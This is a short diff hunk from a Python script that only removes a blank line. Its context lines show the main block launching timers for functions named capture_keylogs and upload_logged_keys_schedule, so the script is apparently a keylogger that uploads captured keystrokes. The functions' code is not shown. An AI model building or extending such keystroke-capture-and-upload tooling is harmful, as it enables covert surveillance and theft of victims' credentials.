@@ -83,7 +83,6 @@ if __name__ == '__main__':
     logging.info('__main__##')
     t1 = threading.Timer(1, capture_keylogs)
     t1.start()
-
     t2 = threading.Timer(1, upload_logged_keys_schedule)
     t2.start()
 
